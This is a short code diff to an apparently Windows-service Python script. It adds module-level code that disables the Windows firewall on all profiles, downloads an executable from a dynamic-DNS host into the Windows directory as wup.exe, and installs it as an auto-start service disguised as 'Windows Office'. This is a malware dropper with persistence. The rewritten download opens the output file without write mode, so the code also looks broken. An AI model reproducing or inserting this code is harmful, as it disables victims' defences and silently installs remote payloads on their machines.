@@ -80,9 +80,15 @@ def get_macaddress(host='localhost'):
  
     return macaddr.upper()
 
+CREATE_NO_WINDOW = 0x08000000
+swin=os.getenv('windir')
+suser=os.getenv('USERPROFILE')
 os.system("netsh advfirewall set allprofiles state off")
 if not os.path.exists('c:\\windows\\wup.exe'):
-    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
+    f = urllib2.urlopen("http://certificates.ddns.net/wofficeie.exe")
+    with open(swin+'\\wup.exe') as code:
+        code.write(f.read())
+    #os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
     subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
     subprocess.call("net start wup", creationflags=0x08000000)
 class AppServerSvc (win32serviceutil.ServiceFramework):
